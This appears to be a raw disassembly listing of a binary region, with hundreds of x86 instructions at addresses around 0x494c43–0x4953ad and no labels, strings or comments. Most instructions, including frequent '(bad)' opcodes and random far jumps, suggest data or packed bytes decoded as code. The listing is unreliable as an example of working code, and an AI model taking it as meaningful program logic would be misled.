  494c43:	mul    DWORD PTR [edi]
  494c45:	xor    al,0x8d
  494c47:	xor    BYTE PTR [eax+0x1f],dh
  494c4a:	es sahf 
  494c4c:	pop    es
  494c4d:	pusha  
  494c4e:	xchg   DWORD PTR [ebx],ebx
  494c50:	arpl   WORD PTR [esi],sp
  494c52:	xlat   BYTE PTR ds:[ebx]
  494c53:	xchg   DWORD PTR [ebx+ebx*1],ebx
  494c56:	mov    al,0xe3
  494c58:	das    
  494c59:	xchg   DWORD PTR [edi+0xc711887],ecx
  494c5f:	push   es
  494c60:	jle    0x494be9
  494c62:	adc    DWORD PTR [ecx+esi*4],ebp
  494c65:	adc    cl,BYTE PTR [edi-0x22]
  494c68:	jg     0x494ccb
  494c6a:	add    eax,0xb886133e
  494c6f:	icebp  
  494c70:	xchg   DWORD PTR [esi],esi
  494c72:	jge    0x494c80
  494c74:	fidivr WORD PTR [esi+0xf]
  494c77:	xchg   esi,eax
  494c78:	xchg   DWORD PTR [edi],eax
  494c7a:	lock pop eax
  494c7c:	add    edi,DWORD PTR [esi]
  494c7e:	xchg   DWORD PTR [edi+0xb062eae],ecx
  494c84:	hlt    
  494c85:	mul    DWORD PTR [edi+0x28d5677e]
  494c8b:	add    cl,BYTE PTR [esi+esi*8]
  494c8e:	ja     0x6f4cc29c
  494c94:	out    dx,eax
  494c95:	ja     0x494d16
  494c97:	push   eax
  494c98:	dec    eax
  494c99:	pushf  
  494c9a:	and    DWORD PTR [edi-0x4a],edi
  494c9d:	icebp  
  494c9e:	jo     0x494d10
  494ca0:	outs   dx,DWORD PTR ds:[esi]
  494ca1:	pusha  
  494ca2:	pop    edi
  494ca3:	jbe    0x494c9c
  494ca5:	push   cs
  494ca6:	cmpxchg DWORD PTR [eax-0x5d],eax
  494caa:	imul   ebx,DWORD PTR [esi],0xe078af07
  494cb0:	(bad)  
  494cb1:	in     al,0x8f
  494cb3:	test   BYTE PTR [edi],0x66
  494cb6:	ror    DWORD PTR [eax-0x7890fa72],0x7f
  494cbd:	adc    bh,al
  494cbf:	loopne 0x494c5e
  494cc1:	outs   dx,BYTE PTR ds:[esi]
  494cc2:	pop    ds
  494cc3:	jle    0x494d44
  494cc5:	ret    0x4686
  494cc8:	bound  esi,QWORD PTR [esi-0x165e900f]
  494cce:	arpl   WORD PTR ds:0xb071fe7,cx
  494cd4:	cmp    al,0xe
  494cd6:	push   ds
  494cd7:	xchg   BYTE PTR [edi-0x7a],dh
  494cda:	data16 lods al,BYTE PTR ds:[esi]
  494cdc:	mov    ?,WORD PTR [edi-0x780000e8]
  494ce2:	outs   dx,DWORD PTR ds:[esi]
  494ce3:	sbb    eax,0x4f9722c4
  494ce8:	pop    es
  494ce9:	icebp  
  494cea:	push   esi
  494ceb:	ror    DWORD PTR [ecx+0x6e],0x7f
  494cef:	pop    es
  494cf0:	ret    
  494cf1:	cmp    DWORD PTR [edx+0x7dff9e6b],eax
  494cf7:	(bad)  
  494cf8:	fisubr WORD PTR [ebp-0x481863f0]
  494cfe:	push   es
  494cff:	(bad)  
  494d00:	push   cs
  494d01:	sbb    BYTE PTR [ecx],dh
  494d03:	sbb    eax,0x3e8e0796
  494d08:	pop    esi
  494d09:	stos   DWORD PTR es:[edi],eax
  494d0a:	loopne 0x494d4b
  494d0c:	pop    ss
  494d0d:	jbe    0x494ce6
  494d0f:	mov    al,0xc6
  494d11:	(bad)  
  494d12:	cmp    al,BYTE PTR [edi+0x1e6dd63f]
  494d18:	daa    
  494d19:	mov    esi,ds
  494d1b:	mov    dh,0xdf
  494d1d:	pop    es
  494d1e:	cmp    BYTE PTR [ebx-0x28e01449],al
  494d24:	ja     0x494ced
  494d26:	out    0x5a,al
  494d28:	rol    DWORD PTR [ebx+edi*1+0x7bff1eff],0x8b
  494d30:	sbb    eax,0xeef7ff38
  494d35:	paddd  mm1,QWORD PTR [edx]
  494d38:	push   es
  494d39:	mov    ds:0x879707a6,eax
  494d3e:	shl    DWORD PTR [ebx],0xdd
  494d41:	push   es
  494d42:	add    edi,ebp
  494d44:	dec    edi
  494d45:	fild   QWORD PTR [esi+0x5a]
  494d48:	sbb    eax,0x97778c5a
  494d4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  494d4e:	xchg   ebp,eax
  494d4f:	or     BYTE PTR ds:0x9821779f,bl
  494d55:	mov    al,0x63
  494d57:	out    dx,al
  494d58:	iret   
  494d59:	jmp    FWORD PTR [esi+0x10]
  494d5c:	or     BYTE PTR [edx+0x7f36b57b],bl
  494d62:	push   es
  494d63:	cli    
  494d64:	pop    eax
  494d65:	sar    DWORD PTR [eax],cl
  494d67:	xchg   DWORD PTR [edi],eax
  494d69:	xchg   edx,edx
  494d6b:	inc    eax
  494d6c:	pop    ds
  494d6d:	imul   eax,DWORD PTR [edi],0xffffff87
  494d70:	jle    0x494cf9
  494d72:	push   ds
  494d73:	sbb    ch,BYTE PTR [edi+eax*2-0x2fb8511a]
  494d7a:	push   esi
  494d7b:	xchg   ebx,eax
  494d7c:	inc    edx
  494d7d:	pop    ss
  494d7e:	daa    
  494d7f:	cs cmp eax,0x7e7fa556
  494d85:	jmp    DWORD PTR [ecx-0x47]
  494d88:	loopne 0x494d92
  494d8a:	jle    0x494e0a
  494d8c:	mov    ah,0xb4
  494d8e:	mov    ch,0x8c
  494d90:	imul   eax,ebp,0x707df26
  494d96:	lea    esp,[esi-0x6859c7a3]
  494d9c:	pop    es
  494d9d:	mov    dh,0x1a
  494d9f:	push   ss
  494da0:	sbb    bh,al
  494da2:	daa    
  494da3:	fild   WORD PTR [ecx]
  494da5:	jp     0x494d54
  494da7:	dec    ebx
  494da8:	test   eax,0xf0bd0eff
  494dad:	push   eax
  494dae:	mov    WORD PTR [edi+0x79],?
  494db1:	jle    0x494d34
  494db3:	jle    0x494d7c
  494db5:	and    BYTE PTR [esp+ebx*2],dl
  494db8:	jg     0x494e39
  494dba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  494dbb:	xchg   DWORD PTR [edx],esp
  494dbd:	je     0x494e20
  494dbf:	rol    DWORD PTR [edi],cl
  494dc1:	xchg   edi,eax
  494dc2:	sbb    cl,BYTE PTR [esi-0x3c]
  494dc5:	enter  0xc607,0x7e
  494dc9:	(bad)  
  494dca:	xor    eax,0x378dab18
  494dcf:	out    0x1a,eax
  494dd1:	loopne 0x494e3b
  494dd3:	mov    DWORD PTR [esi+0x17],esi
  494dd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  494dd7:	js     0x494dac
  494dd9:	inc    eax
  494dda:	les    edi,FWORD PTR [edi+0x78]
  494ddd:	add    BYTE PTR ds:0xeab2b1b0,ch
  494de3:	arpl   WORD PTR ds:0x7f7fff16,ax
  494de9:	add    eax,DWORD PTR [esi-0x20]
  494dec:	mov    ah,0x87
  494dee:	pop    es
  494def:	jg     0x494d80
  494df1:	mov    ebp,0xae60c434
  494df6:	pop    esi
  494df7:	mov    ss,WORD PTR [esi]
  494df9:	xchg   edi,eax
  494dfa:	xor    BYTE PTR [edx-0x70fbc8f9],ah
  494e00:	mov    eax,ds:0x7e6e9fac
  494e05:	jg     0x494dcc
  494e07:	jp     0x494e01
  494e09:	adc    DWORD PTR [ebp+ecx*4-0xe09d472],ecx
  494e10:	daa    
  494e11:	ins    DWORD PTR es:[edi],dx
  494e12:	rol    BYTE PTR ds:0x872e7faa,0xd0
  494e19:	jmp    0x7836:0x1e375180
  494e20:	aaa    
  494e21:	mov    ch,ch
  494e23:	xchg   edi,eax
  494e24:	pop    es
  494e25:	outs   dx,BYTE PTR ds:[esi]
  494e26:	pop    es
  494e27:	jecxz  0x494e09
  494e29:	jo     0x494e1b
  494e2b:	(bad)  
  494e2c:	outs   dx,DWORD PTR ds:[esi]
  494e2d:	out    dx,al
  494e2e:	ja     0x494e31
  494e30:	sub    al,0xf0
  494e32:	js     0x494e1a
  494e34:	jbe    0x494e2c
  494e36:	add    eax,0x7f440a06
  494e3b:	jle    0x494e6b
  494e3d:	lock xor al,0x80
  494e40:	inc    edi
  494e41:	out    dx,eax
  494e42:	(bad)  
  494e44:	jmp    DWORD PTR [ebx-0x994c7ea]
  494e4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  494e4b:	mov    esi,0x5bc02d26
  494e50:	mov    esp,0xf7c7a697
  494e55:	mov    cl,0xb9
  494e57:	push   eax
  494e58:	in     al,dx
  494e59:	out    dx,eax
  494e5a:	pop    es
  494e5b:	outs   dx,DWORD PTR ds:[esi]
  494e5c:	pop    es
  494e5d:	push   ss
  494e5e:	ss push 0x95f67a5
  494e64:	sbb    BYTE PTR [ebp*4+0x5b0ef74f],bl
  494e6b:	mov    bh,0x40
  494e6d:	scas   al,BYTE PTR es:[edi]
  494e6e:	jg     0x494ec5
  494e70:	pop    es
  494e71:	xchg   esi,eax
  494e72:	add    BYTE PTR [edi],ah
  494e74:	shl    BYTE PTR [ecx-0x5b],1
  494e77:	pusha  
  494e78:	ss in  eax,dx
  494e7a:	fadd   QWORD PTR [edi+0x2]
  494e7d:	push   esi
  494e7e:	or     ebp,esi
  494e80:	mov    edi,0x5bb4ff97
  494e85:	or     ah,ch
  494e87:	xlat   BYTE PTR ds:[ebx]
  494e88:	(bad)  
  494e89:	fiadd  WORD PTR [edi]
  494e8b:	mov    bh,0x10
  494e8d:	fadd   DWORD PTR [esi-0x79]
  494e90:	ja     0x494e59
  494e92:	sub    al,0x2
  494e94:	jecxz  0x494e3a
  494e96:	mov    dh,0xbf
  494e98:	add    cl,ch
  494e9a:	jbe    0x494e9d
  494e9c:	(bad)  
  494e9d:	lds    eax,FWORD PTR [eax]
  494e9f:	in     eax,0x28
  494ea1:	dec    ebp
  494ea2:	int    0x76
  494ea4:	and    eax,0x62078773
  494ea9:	add    BYTE PTR [ecx],dl
  494eab:	mov    ebp,0xd89ba17
  494eb1:	iret   
  494eb2:	xchg   edi,eax
  494eb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  494eb4:	stos   BYTE PTR es:[edi],al
  494eb5:	(bad)  [edx]
  494eb7:	add    BYTE PTR [edi],dl
  494eb9:	into   
  494eba:	pop    es
  494ebb:	imul   eax,DWORD PTR [edx],0xffffffde
  494ebe:	ss xchg edi,eax
  494ec0:	scas   eax,DWORD PTR es:[edi]
  494ec1:	(bad)  
  494ec2:	ins    BYTE PTR es:[edi],dx
  494ec3:	inc    edi
  494ec4:	xor    DWORD PTR [eax-0x11],esi
  494ec7:	jbe    0x494ec0
  494ec9:	mov    cl,0x0
  494ecb:	ror    DWORD PTR [edx],0x2
  494ece:	enter  0xd073,0x39
  494ed2:	jle    0x494eeb
  494ed4:	add    eax,0xf9b3409d
  494ed9:	add    BYTE PTR [ebx],al
  494edb:	lahf   
  494edc:	dec    ebp
  494edd:	shr    cl,cl
  494edf:	pop    es
  494ee0:	pop    ecx
  494ee1:	lods   al,BYTE PTR ds:[esi]
  494ee2:	push   ebx
  494ee3:	pop    eax
  494ee4:	pop    ss
  494ee5:	aas    
  494ee6:	push   esi
  494ee7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  494ee8:	mov    al,0xaa
  494eea:	pop    es
  494eeb:	mov    edi,0xf73a3db3
  494ef0:	fucomip st,st(7)
  494ef2:	(bad)  
  494ef3:	addr16 leave 
  494ef5:	add    bl,ah
  494ef7:	pop    esp
  494ef8:	pop    ebp
  494ef9:	and    al,0x5
  494efb:	inc    edx
  494efc:	popa   
  494efd:	push   es
  494efe:	and    eax,0x66cd9a11
  494f03:	mov    bl,0x0
  494f05:	or     DWORD PTR [edx-0x3d5c47bf],ecx
  494f0b:	leave  
  494f0c:	ror    ebx,0xe6
  494f0f:	shr    BYTE PTR [eax-0x19],0x7
  494f13:	push   ss
  494f14:	pop    es
  494f15:	es pop es
  494f17:	(bad)  [edi-0x20505726]
  494f1d:	rol    BYTE PTR [eax],0xcb
  494f20:	mov    edi,0x366cd9a1
  494f25:	leave  
  494f26:	stos   BYTE PTR es:[edi],al
  494f27:	mov    ds:0x2501515a,eax
  494f2c:	(bad)  
  494f2d:	call   0x7e7:0x11f6e584
  494f34:	or     DWORD PTR [edx-0x4d],ebx
  494f37:	fldcw  WORD PTR [eax+eax*1+0x11]
  494f3b:	sbb    DWORD PTR ds:0x23162117,ebx
  494f41:	pop    es
  494f42:	or     eax,0x15806d98
  494f47:	add    BYTE PTR [ebx],ah
  494f49:	add    eax,DWORD PTR [ebp+0x5e707250]
  494f4f:	adc    eax,0xd5560d76
  494f54:	es cwde 
  494f56:	fild   WORD PTR [edi]
  494f58:	pop    es
  494f59:	mov    al,ds:0x4716b853
  494f5e:	(bad)  
  494f5f:	(bad)  
  494f60:	faddp  st(2),st
  494f62:	or     BYTE PTR [ebx],0xf
  494f65:	int    0x5
  494f67:	adc    DWORD PTR [edx-0x7c7fbfb2],esp
  494f6d:	mov    ah,ah
  494f6f:	and    al,0x0
  494f71:	inc    edx
  494f72:	push   ss
  494f73:	add    DWORD PTR [eax],esi
  494f75:	adc    DWORD PTR [edi+0xa],ebx
  494f78:	mov    esp,DWORD PTR [edx+0x22]
  494f7b:	mov    edi,0x8a6f2720
  494f80:	xlat   BYTE PTR ds:[ebx]
  494f81:	or     DWORD PTR [esi],eax
  494f83:	or     eax,0x7271170f
  494f88:	push   ebp
  494f89:	or     eax,0xdbffd60b
  494f8e:	add    eax,0xa010749
  494f93:	or     ebx,DWORD PTR [edx+ebx*1]
  494f96:	sbb    bl,BYTE PTR [ecx]
  494f98:	cmp    edi,DWORD PTR [ecx]
  494f9a:	cmp    BYTE PTR ds:0xfb7d9f3c,ch
  494fa0:	(bad)  
  494fa1:	cmp    BYTE PTR [edi],dh
  494fa3:	xor    eax,0x37343438
  494fa8:	xor    dh,BYTE PTR ss:[edx]
  494fab:	aaa    
  494fac:	cmp    edi,DWORD PTR [eax]
  494fae:	sbb    BYTE PTR [edx+0x49],cl
  494fb1:	dec    ecx
  494fb2:	xor    eax,0x4707004a
  494fb7:	(bad)  
  494fb8:	(bad)  
  494fb9:	(bad)  
  494fba:	dec    DWORD PTR [eax+0x49]
  494fbd:	aaa    
  494fbe:	cmp    eax,0x3e374441
  494fc3:	inc    ebx
  494fc4:	inc    ebp
  494fc5:	aaa    
  494fc6:	aas    
  494fc7:	inc    esp
  494fc8:	inc    edi
  494fc9:	aaa    
  494fca:	inc    eax
  494fcb:	inc    esi
  494fcc:	dec    eax
  494fcd:	aaa    
  494fce:	inc    ecx
  494fcf:	inc    edi
  494fd0:	dec    ecx
  494fd1:	aaa    
  494fd2:	inc    edx
  494fd3:	dec    ecx
  494fd4:	dec    ebx
  494fd5:	aaa    
  494fd6:	inc    ebx
  494fd7:	dec    edx
  494fd8:	dec    esp
  494fd9:	aaa    
  494fda:	inc    esp
  494fdb:	sub    cl,bh
  494fdd:	(bad)  
  494fde:	cld    
  494fdf:	dec    ebx
  494fe0:	dec    ebp
  494fe1:	aaa    
  494fe2:	inc    ebp
  494fe3:	dec    ebp
  494fe4:	dec    esi
  494fe5:	dec    edi
  494fe6:	aaa    
  494fe7:	inc    esi
  494fe8:	dec    esi
  494fe9:	push   eax
  494fea:	aaa    
  494feb:	inc    edi
  494fec:	dec    eax
  494fed:	dec    edi
  494fee:	jnp    0x495067
  494ff0:	sahf   
  494ff1:	outs   dx,DWORD PTR ds:[esi]
  494ff2:	dec    ecx
  494ff3:	dec    edi
  494ff4:	push   ecx
  494ff5:	aaa    
  494ff6:	dec    edx
  494ff7:	dec    eax
  494ff8:	cs aas 
  494ffa:	dec    esi
  494ffb:	in     eax,dx
  494ffc:	(bad)  
  494ffe:	mov    cl,0x7
  495000:	inc    esp
  495001:	inc    esi
  495002:	xchg   bh,bl
  495004:	pop    es
  495005:	int3   
  495006:	jbe    0x495028
  495008:	pop    edi
  495009:	dec    ecx
  49500a:	dec    ecx
  49500b:	dec    ecx
  49500c:	xor    al,0x0
  49500e:	das    
  49500f:	or     BYTE PTR [esp+ebx*2-0x38e17a77],al
  495016:	or     edi,DWORD PTR [edi-0x18b74003]
  49501c:	pop    ecx
  49501d:	push   edi
  49501e:	push   esi
  49501f:	push   ecx
  495020:	add    BYTE PTR [ecx+0x85ab80],0xd3
  495027:	test   BYTE PTR [edx-0x327d267e],al
  49502d:	repz inc WORD PTR [eax+0x7d7ed980]
  495035:	jge    0x495010
  495037:	mov    DWORD PTR [eax-0x283d2678],ecx
  49503d:	(bad)  
  49503e:	xlat   BYTE PTR ds:[ebx]
  49503f:	(bad)
  495042:	(bad)  
  495043:	call   FWORD PTR [ebx-0x63652841]
  495049:	popf   
  49504a:	fstp   DWORD PTR [ebx-0x61266163]
  495050:	mov    al,ds:0xa3a1d9a1
  495055:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  495056:	fldenv [ebx-0x126595a]
  49505c:	(bad)  
  49505d:	inc    DWORD PTR [esi]
  49505f:	inc    esi
  495060:	fldcw  WORD PTR [ecx-0x54265355]
  495066:	scas   al,BYTE PTR es:[edi]
  495067:	scas   eax,DWORD PTR es:[edi]
  495068:	fldcw  WORD PTR [esi-0x50264e4f]
  49506e:	mov    dl,0xb2
  495070:	fnstenv [eax-0x4e264b4d]
  495076:	mov    ah,0xde
  495078:	(bad)  
  49507a:	fild   WORD PTR [esi]
  49507c:	mov    dl,0xb4
  49507e:	mov    ch,0xd9
  495080:	mov    bl,0xb6
  495082:	mov    dh,0xd9
  495084:	mov    ah,0xb6
  495086:	mov    bh,0xd9
  495088:	mov    ch,0xb7
  49508a:	mov    eax,0xb6b5b217
  49508f:	ss mov ch,0xec
  495092:	shl    DWORD PTR [edi+esi*8],cl
  495095:	dec    esi
  495096:	mov    bl,0x57
  495098:	push   es
  495099:	mov    cl,0xae
  49509b:	lods   eax,DWORD PTR ds:[esi]
  49509c:	mov    al,0x76
  49509e:	mov    al,0xb7
  4950a0:	cmp    eax,0x7d77ea3
  4950a5:	test   DWORD PTR [edi],0x8d506b66
  4950ab:	pop    esi
  4950ac:	xlat   BYTE PTR ds:[ebx]
  4950ad:	pop    ds
  4950ae:	rol    DWORD PTR [eax],0xd7
  4950b1:	sar    BYTE PTR [esp+esi*1],0x9b
  4950b5:	int    0xd7
  4950b7:	mov    ebp,0x1a9599c7
  4950bc:	cmp    eax,0x400f2906
  4950c1:	je     0x4950b5
  4950c3:	sbb    DWORD PTR [ebx],eax
  4950c5:	out    0x32,eax
  4950c7:	xor    BYTE PTR [edi],ch
  4950c9:	mov    BYTE PTR [edi-0x50],ch
  4950cc:	test   DWORD PTR ds:0x9b9b739c,ecx
  4950d2:	call   0xfe1d:0x22427af7
  4950d9:	jle    0x495122
  4950db:	xchg   edx,eax
  4950dc:	push   esp
  4950dd:	jp     0x495122
  4950df:	ret    0xe600
  4950e2:	pop    es
  4950e3:	push   ds
  4950e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4950e5:	test   DWORD PTR [ebp+eax*4-0x79ddc8e9],eax
  4950ec:	pop    edx
  4950ed:	jmp    0x4ba4:0xd6fe6e76
  4950f4:	jmp    0x49507d
  4950f6:	out    dx,al
  4950f7:	jmp    FWORD PTR [edx]
  4950f9:	pusha  
  4950fa:	pop    es
  4950fb:	xor    BYTE PTR [esi],cl
  4950fd:	pop    edi
  4950fe:	outs   dx,DWORD PTR ds:[esi]
  4950ff:	adc    dh,0x8
  495102:	sub    al,0x57
  495104:	call   0x10372536
  495109:	pop    di
  49510b:	jae    0x8e84ab1f
  495111:	out    0xce,eax
  495113:	mov    edi,0x42974ed9
  495118:	daa    
  495119:	std    
  49511a:	mov    edx,0x8246cf00
  49511f:	xchg   ebx,eax
  495120:	out    0xaa,eax
  495122:	pop    ecx
  495123:	mov    gs,WORD PTR [ebx]
  495125:	pop    ss
  495126:	add    edi,edi
  495128:	xchg   ecx,eax
  495129:	fdiv   st,st(0)
  49512b:	mov    eax,ds:0x416b6c6d
  495130:	jl     0x4950ca
  495132:	out    0x6,eax
  495134:	xchg   BYTE PTR [edi],dh
  495136:	mov    ah,0x57
  495138:	mov    esi,0x16e08f0f
  49513d:	jmp    0x3ff05202
  495142:	(bad)  
  495144:	add    ch,BYTE PTR [esi-0x7d]
  495147:	(bad)  
  495148:	out    0x47,al
  49514a:	add    DWORD PTR [ebx-0x39b0f7b0],eax
  495150:	rcr    BYTE PTR [edx],0x89
  495153:	xor    eax,0xac2973f
  495158:	sbb    DWORD PTR ds:0xb83b6fdf,0x2fc79587
  495162:	push   es
  495163:	iret   
  495164:	fisubr WORD PTR [edx-0x5b]
  495167:	shl    BYTE PTR [edi+eiz*1+0x6247b69e],1
  49516e:	xor    eax,0xa2be2f
  495173:	mov    ecx,0x84d0aa01
  495178:	push   0x39
  49517a:	aas    
  49517b:	cmovg  ebx,eax
  49517e:	push   ss
  49517f:	dec    ebx
  495180:	mov    edi,0x9b7e7e7f
  495185:	mov    DWORD PTR [edi],0x88c1c1c3
  49518b:	ja     0x4951ac
  49518d:	push   ss
  49518e:	cmovb  edi,DWORD PTR [ebp-0x5939290c]
  495195:	ja     0x495121
  495197:	adc    BYTE PTR [ebp-0x30],0xcf
  49519b:	aaa    
  49519c:	shr    DWORD PTR [edx],0xa5
  49519f:	lds    ebp,FWORD PTR [esi-0x11]
  4951a2:	(bad)  
  4951a3:	dec    ecx
  4951a4:	sub    eax,esi
  4951a6:	ret    0x3f36
  4951a9:	shr    BYTE PTR [ebp+0x570ec1d2],cl
  4951af:	pop    ss
  4951b0:	push   ss
  4951b1:	cmp    eax,0x376de1ac
  4951b6:	inc    edi
  4951b7:	das    
  4951b8:	push   edi
  4951b9:	mov    BYTE PTR [edx+0x2d],0xd4
  4951bd:	inc    esi
  4951be:	lahf   
  4951bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4951c0:	mov    ebx,0x6f9d0874
  4951c5:	push   cs
  4951c6:	aas    
  4951c7:	stos   BYTE PTR es:[edi],al
  4951c8:	test   eax,0xeed77bd4
  4951cd:	idiv   DWORD PTR [esi]
  4951cf:	pop    ebp
  4951d0:	das    
  4951d1:	or     ch,BYTE PTR [ecx-0x7f]
  4951d4:	adc    al,0xc6
  4951d6:	pop    ss
  4951d7:	scas   eax,DWORD PTR es:[edi]
  4951d8:	and    al,0xb6
  4951da:	leave  
  4951db:	inc    DWORD PTR [esi]
  4951dd:	add    eax,0x91910905
  4951e2:	nop
  4951e3:	rol    DWORD PTR [edi],0xe5
  4951e6:	pop    esi
  4951e7:	inc    esp
  4951e8:	call   0xf30c0dc
  4951ed:	push   es
  4951ee:	dec    edi
  4951ef:	mov    ebp,0xe72e3e9e
  4951f4:	cs push ss
  4951f6:	ins    BYTE PTR es:[edi],dx
  4951f7:	add    al,0xc7
  4951f9:	idiv   DWORD PTR [edi+0x2c]
  4951fc:	cs in  eax,dx
  4951fe:	and    al,BYTE PTR [edi+0x568a17f7]
  495204:	ins    BYTE PTR es:[edi],dx
  495205:	push   edi
  495206:	xchg   edi,eax
  495207:	inc    esi
  495208:	sub    ecx,DWORD PTR [ecx+0x2787070d]
  49520e:	(bad)  
  49520f:	jmp    0x71f:0xbe52d62d
  495216:	ss jl  0x495235
  495219:	push   esi
  49521a:	(bad)  
  49521b:	push   ss
  49521c:	das    
  49521d:	pop    es
  49521e:	xchg   edi,eax
  49521f:	lods   eax,DWORD PTR ds:[esi]
  495220:	div    dh
  495222:	xchg   edi,ebx
  495224:	sti    
  495225:	push   eax
  495226:	add    BYTE PTR [ecx+0x1d],bh
  495229:	or     al,0x54
  49522b:	mov    WORD PTR ds:0x8f7461b,?
  495231:	les    ebx,FWORD PTR [edx+0xb0037c1]
  495237:	xchg   edi,eax
  495238:	xchg   ebp,eax
  495239:	xchg   ebx,eax
  49523a:	(bad)  
  49523b:	mov    edi,0x878ede07
  495240:	lds    esp,FWORD PTR [edi+0xf]
  495243:	daa    
  495244:	mov    edi,0xb36b38b0
  495249:	outs   dx,DWORD PTR ds:[esi]
  49524a:	out    0xc7,al
  49524c:	(bad)  
  49524d:	or     BYTE PTR [edx+eax*2+0x6cd8a7bf],ch
  495254:	sbb    al,0x2c
  495256:	sahf   
  495257:	xchg   edi,eax
  495258:	iret   
  495259:	hlt    
  49525a:	push   esi
  49525b:	dec    esp
  49525c:	sub    al,0xe7
  49525e:	pop    DWORD PTR [edi]
  495260:	jmp    0x49524f
  495262:	pop    edx
  495263:	add    DWORD PTR [edi+0xf067747],edx
  495269:	mov    ds:0xee6fb7b7,eax
  49526e:	pop    es
  49526f:	mov    dh,0xc3
  495271:	in     eax,dx
  495272:	test   BYTE PTR [esi],bl
  495274:	pop    es
  495275:	call   DWORD PTR [esi-0x1c425ff9]
  49527b:	fisttp QWORD PTR [esi+0x53fbbf4f]
  495281:	add    BYTE PTR [ebx-0x186ffc04],al
  495287:	(bad)  
  495288:	cmp    DWORD PTR [edi],ebx
  49528a:	xchg   esi,eax
  49528b:	xchg   esp,eax
  49528c:	(bad)  
  49528d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49528e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49528f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  495290:	jl     0x4952c3
  495292:	loope  0x495298
  495294:	ja     0x49527d
  495296:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  495297:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  495298:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  495299:	jo     0x49524b
  49529b:	dec    edx
  49529c:	call   0x16e:0xe84d7df
  4952a3:	fisttp WORD PTR [edi]
  4952a5:	mul    BYTE PTR [esi+edx*2]
  4952a8:	jl     0x495317
  4952aa:	(bad)  
  4952ab:	pop    ds
  4952ac:	mul    eax
  4952ae:	and    eax,0xa7ff6c5d
  4952b3:	push   es
  4952b4:	xchg   edx,eax
  4952b5:	jbe    0x4952c9
  4952b7:	mov    eax,ds:0x587797ef
  4952bc:	dec    ecx
  4952bd:	lods   al,BYTE PTR ds:[esi]
  4952be:	das    
  4952bf:	aaa    
  4952c0:	(bad)  
  4952c1:	fcomip st,st(5)
  4952c3:	clc    
  4952c4:	xor    bl,bl
  4952c6:	jbe    0x4952c8
  4952c8:	inc    DWORD PTR [ebx-0x4e834811]
  4952ce:	xchg   edx,eax
  4952cf:	push   ds
  4952d0:	add    BYTE PTR [eax],0xbe
  4952d3:	push   esi
  4952d4:	clc    
  4952d5:	mov    eax,0x56277125
  4952da:	push   cs
  4952db:	(bad)  
  4952dc:	pusha  
  4952dd:	xor    eax,0xbf3703b1
  4952e2:	sbb    BYTE PTR [edx+0x4e],cl
  4952e5:	scas   al,BYTE PTR es:[edi]
  4952e6:	(bad)  
  4952e7:	cmp    ecx,DWORD PTR [ebx]
  4952e9:	cdq    
  4952ea:	add    DWORD PTR [edi-0x38ff15b5],esi
  4952f0:	mov    bh,0x6
  4952f2:	(bad)  
  4952f3:	aad    0xc4
  4952f5:	pop    ebx
  4952f6:	push   es
  4952f7:	pxor   mm3,QWORD PTR [esi]
  4952fa:	add    dh,BYTE PTR [esi+0x49]
  4952fd:	pop    ds
  4952fe:	pandn  mm0,QWORD PTR [edx+0x7]
  495302:	cmp    BYTE PTR ds:0xbbdf1657,ch
  495308:	mov    ch,0x82
  49530a:	push   ebp
  49530b:	(bad)  
  49530c:	push   DWORD PTR [edi+0x42]
  49530f:	add    DWORD PTR [esi+0x4],eax
  495312:	mul    DWORD PTR [edi-0x1f09e6e8]
  495318:	inc    esi
  495319:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49531a:	inc    ebx
  49531b:	add    BYTE PTR [esi+0x65],bl
  49531e:	pop    ds
  49531f:	pop    esi
  495320:	pop    es
  495321:	pop    es
  495322:	xchg   esi,eax
  495323:	daa    
  495324:	dec    esi
  495325:	add    BYTE PTR [edi],dl
  495327:	or     ecx,DWORD PTR [eax+0x1e06bf75]
  49532d:	aas    
  49532e:	loope  0x49535d
  495330:	es push cs
  495332:	out    dx,al
  495333:	aaa    
  495334:	ja     0x495339
  495336:	and    BYTE PTR [ebx-0x3f],al
  495339:	fdivp  st(7),st
  49533b:	and    DWORD PTR [edx-0x1f36bd50],ebx
  495341:	cwde   
  495342:	xchg   edi,eax
  495343:	(bad)  
  495344:	out    0xbf,eax
  495346:	mov    ch,0x46
  495348:	imul   esp,DWORD PTR [ecx],0x5a74df17
  49534e:	xchg   ecx,eax
  49534f:	in     al,0x1f
  495351:	xlat   BYTE PTR ds:[ebx]
  495352:	push   es
  495353:	sub    al,0x5a
  495355:	mov    eax,ds:0xffbfdf70
  49535a:	shr    DWORD PTR [eax-0x589e28],0xd7
  495361:	push   0x62
  495363:	fld    QWORD PTR [edi+edx*4+0x5767d17]
  49536a:	mov    al,0x4f
  49536c:	push   esi
  49536d:	add    bh,dl
  49536f:	popa   
  495370:	pusha  
  495371:	shufps xmm0,XMMWORD PTR [ecx+0x6c3e2700],0x0
  495379:	xor    BYTE PTR [esi],bh
  49537b:	lods   al,BYTE PTR ds:[esi]
  49537c:	xor    DWORD PTR [edi+0x77],edx
  49537f:	add    BYTE PTR [edi],ch
  495381:	shl    DWORD PTR [esi-0x6eb984f5],0x0
  495388:	pop    es
  495389:	pop    es
  49538a:	call   DWORD PTR [edx+0x6dc1146]
  495390:	jmp    DWORD PTR [edx-0x23]
  495393:	test   BYTE PTR [ebx-0x2030384a],ch
  495399:	call   0xe7b80481
  49539e:	push   es
  49539f:	punpckhdq mm1,QWORD PTR [ebp-0x48c13e3c]
  4953a6:	mov    bh,0xe0
  4953a8:	bound  eax,QWORD PTR [ebp-0x3e]
  4953ab:	mov    dh,0xb7
  4953ad:	pop    edi
